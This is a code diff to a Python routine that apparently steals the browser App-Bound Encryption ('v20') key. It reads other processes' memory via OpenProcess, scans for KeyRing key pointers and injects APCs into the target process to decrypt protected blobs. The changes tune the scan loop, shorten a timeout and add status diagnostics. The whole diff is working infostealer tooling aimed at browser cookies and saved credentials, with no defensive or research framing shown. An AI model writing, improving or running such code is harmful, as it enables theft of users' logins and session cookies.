@@ -3688,7 +3688,7 @@ class _RemoteUnprotect:
             return None
         return bytes(out)
 
-    def _wait_changed(self, addr: int, before: bytes, timeout: float = 0.08) -> bytes | None:
+    def _wait_changed(self, addr: int, before: bytes, timeout: float = 0.03) -> bytes | None:
         deadline = time.monotonic() + timeout
         last: bytes | None = None
         while time.monotonic() < deadline:
@@ -3877,6 +3877,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     apc_changed = 0
     apc_queued = 0
     apc_status = 0
+    found_ptrs = 0
     seen: set[bytes] = set()
     PROCESS_VM_READ = 0x0010
     PROCESS_QUERY_INFORMATION = 0x0400
@@ -3889,11 +3890,19 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     allowed_prot = {0x02, 0x04, 0x08, 0x40}
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
 
+    def apc_extra() -> str:
+        if not unprotect_ok:
+            return ";apc:setup"
+        if apc_queued == 0:
+            return f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:setup"
+        if apc_changed == 0:
+            return ";apc:0"
+        return ";apc:ok"
+
     def consider(
         cand: bytes | None,
         unprotect: _RemoteUnprotect | None,
         addr: int | None = None,
-        use_apc: bool = True,
     ) -> bytes | None:
         nonlocal tried
         if not cand or cand in seen or not _high_entropy32(cand):
@@ -3902,7 +3911,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         tried += 1
         if _v20_key_ok(cand, v20_sample):
             return cand
-        if use_apc and unprotect is not None and unprotect.ok:
+        if unprotect is not None and unprotect.ok:
             if addr:
                 plain = unprotect.unprotect_at(addr)
                 if _v20_key_ok(plain, v20_sample):
@@ -3912,25 +3921,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                 return plain
         return None
 
-    def try_blobs(
-        items: list[tuple[int, bytes]],
-        unprotect: _RemoteUnprotect | None,
-        use_apc: bool,
-        apc_budget: int = 0,
-    ) -> bytes | None:
-        left = apc_budget
-        for ptr, blob in items:
-            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                break
-            apc_this = use_apc and (apc_budget <= 0 or left > 0)
-            for cand in _keys_from_key_blob(blob):
-                hit = consider(cand, unprotect, ptr, apc_this)
-                if hit:
-                    return hit
-            if apc_this and apc_budget > 0:
-                left -= 1
-        return None
-
+    probed_apc = False
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
@@ -3947,9 +3938,10 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         unprotect = _RemoteUnprotect(pid)
         if unprotect.ok:
             unprotect_ok += 1
-        keyring_items: list[tuple[int, bytes]] = []
-        generic_items: list[tuple[int, bytes]] = []
-        seen_ptr: set[int] = set()
+            if not probed_apc:
+                # One SAME_PROCESS APC so failure hr cannot omit apc:0 / apc:ok / apc:hr.
+                unprotect.unprotect(b"\x00" * 32)
+                probed_apc = True
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -3987,36 +3979,41 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     ) and int(got.value) >= 16:
                         data = bytes(raw[: int(got.value)])
                         scanned += len(data)
-                        kr = _keyring_v20_key_ptrs(data)
-                        for ptr in kr:
+                        seen_ptr: set[int] = set()
+                        # KeyRing v20 first, then every 32-byte vector in this region
+                        # (765d4c5 in-scan). Do not defer consider() past the deadline.
+                        for ptr in _keyring_v20_key_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
+                            seen_ptr.add(ptr)
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
                             blob = readn(handle, ptr, 32)
                             if not blob:
                                 continue
-                            seen_ptr.add(ptr)
-                            keyring_items.append((ptr, blob))
+                            found_ptrs += 1
+                            for cand in _keys_from_key_blob(blob):
+                                hit = consider(cand, unprotect, ptr)
+                                if hit:
+                                    return hit, "ok"
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
+                            seen_ptr.add(ptr)
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
                             blob = readn(handle, ptr, min(max(nbytes, 32), 512))
                             if not blob:
                                 continue
-                            seen_ptr.add(ptr)
-                            generic_items.append((ptr, blob))
+                            found_ptrs += 1
+                            for cand in _keys_from_key_blob(blob):
+                                hit = consider(cand, unprotect, ptr)
+                                if hit:
+                                    return hit, "ok"
                 nxt = addr + size
                 if nxt <= addr:
                     break
                 addr = nxt
-            hit = try_blobs(keyring_items, unprotect, True)
-            if hit:
-                return hit, "ok"
-            # KeyRing first; only a few generic vectors get APC so the 6s budget
-            # is not spent on 2000 junk 32-byte objects (765d4c5: 68 tries, no key).
-            generic_apc = 16 if not keyring_items else 8
-            hit = try_blobs(generic_items, unprotect, True, generic_apc)
-            if hit:
-                return hit, "ok"
         finally:
             apc_changed += int(unprotect.changed)
             apc_queued += int(unprotect.queued)
@@ -4024,18 +4021,13 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                 apc_status = int(unprotect.last_status)
             unprotect.close()
             kernel32.CloseHandle(handle)
+    extra = apc_extra()
     if opened == 0:
-        return None, "memscan:OpenProcess"
+        return None, f"memscan:OpenProcess{extra}"
     if tried == 0:
-        return None, "memscan:no_cand"
-    if not unprotect_ok:
-        extra = ";apc:setup"
-    elif apc_queued == 0:
-        extra = f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:setup"
-    elif apc_changed == 0:
-        extra = ";apc:0"
-    else:
-        extra = ";apc:ok"
+        if found_ptrs:
+            return None, f"memscan:cands={found_ptrs}{extra}"
+        return None, f"memscan:no_cand{extra}"
     return None, f"memscan:no_key:{tried}{extra}"
 
 
